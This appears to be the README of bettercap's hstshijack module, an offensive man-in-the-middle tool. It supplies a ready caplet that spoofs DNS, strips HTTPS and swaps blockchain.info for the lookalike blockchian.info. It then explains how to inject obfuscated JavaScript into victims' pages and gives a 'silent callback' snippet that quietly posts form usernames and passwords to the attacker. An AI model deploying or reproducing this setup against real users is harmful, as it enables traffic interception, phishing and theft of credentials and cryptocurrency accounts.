<p align="center">
  <img width="420px" src="https://cdn.rawgit.com/yungtravla/cdn/ccdc3b8d/github.com/bettercap/caplets/hstshijack/logo.svg" />
</p>

### Caplet

```sh
set hstshijack.log             caplets/hstshijack/ssl.log
set hstshijack.payload         caplets/hstshijack/payloads/hstshijack-payload.js
set hstshijack.ignore          *
set hstshijack.targets         blockchain.info,*.blockchain.info
set hstshijack.replacements    blockchian.info,*.blockchian.info
#set hstshijack.blockscripts    domain.com,*.domain.com
set hstshijack.custompayloads  *:caplets/hstshijack/payloads/sslstrip.js

set http.proxy.script  caplets/hstshijack/hstshijack.js
#set net.sniff.output   hstshijack0001.pcap
set net.sniff.verbose  false
set dns.spoof.all      true
net.sniff    on
dns.spoof    on
http.proxy   on
```

### Core payload

This module injects HTTP documents with a JS payload (<a href="./payloads/hstshijack-payload.js">**hstshijack-payload.js**</a>). This payload communicates with the bettercap sniffer, revealing all URLs that were discovered on the injected document once it finished loading.

This is done in separate and asynchronous requests so that bettercap can adjust the host and path for each request, and then send a HEAD request in order to learn each host's response to a HTTP request for the given path.

### SSL log

If a host responds with a HTTPS redirect, the module saves this host in the SSL log, and bettercap will from then on spoof SSL connections for this host when possible.

### Hostname spoofing

In the <a href="./hstshijack.cap">**caplet file**</a> you can assign comma separated domains to the `hstshijack.targets` variable. _(wildcard allowed)_

For every hostname you assign to `hstshijack.targets` you must assign a replacement domain to the `hstshijack.replacements` variable.

Example:

```sh
set hstshijack.targets       blockchain.info,*.blockchain.info
set hstshijack.replacements  blockchian.info,*.blockchian.info
```

You can try to make them as unnoticeable or obvious as you like, but your options are limited here.

### Block scripts

In the <a href="./hstshijack.cap">**caplet file**</a> you can block JavaScript on hosts by assigning them to the `hstshijack.blockscripts` variable. _(wildcard allowed)_ 

### Custom payloads

You can also inject your own JavaScript payload(s) into HTML & JS files from targeted hosts by assigning them to the `hstshijack.custompayloads` variable.

Example:

```sh
hstshijack.custompayloads *:caplets/hstshijack/payloads/sslstrip.js,google.com:caplets/hstshijack/payloads/google.js,*.google.com:caplets/hstshijack/payloads/google.js
```

Once the payload is injected into a page, you can technically phish any data unless the client navigates to a URL that either has strict transport security rules enforced by their browser, or the URL was not stripped due to JavaScript security.

<a href="./payloads/sslstrip.js">**sslstrip.js**</a> is included, which strips the `s` from all `https://` instances in `<a href="...` tags.

### Obfuscation

You can write custom payloads that are automatically obfuscated by the module.

Basically every word that was found beginning with `obf_` will be obfuscated.


Example: 

```js
function obf_function() {
  alert("Random variable: obf_whatever_follows")
}

obf_function()
```

Will be injected as:

```js
function jfIleNwmKoa() {
  alert("Random variable: AsjZnJWklwMNqshCaloE")
}

jfIleNwmKoa()
```

### Silent callbacks

You can write custom payloads that communicate with bettercap without alerting the host.

Example of a silent callback:

```js
form.onsubmit = function() {
  req = new XMLHttpRequest()
  req.open("POST", "http://" + location.host + "/obf_path_callback?username=" + username + "&password=" + password)
  req.send()
}
```

The following POST request will be sniffed by bettercap, but not proxied. 

As soon as bettercap receives a callback, any request from the client for a spoofed hostname will immediately be redirected to the legitimate hostname, and any request for that targeted hostname will no longer be spoofed for this particular client.

Note: Any instance of `obf_path_callback` will be replaced with the callback path that bettercap listens for (this can save time when writing JavaScript payloads).
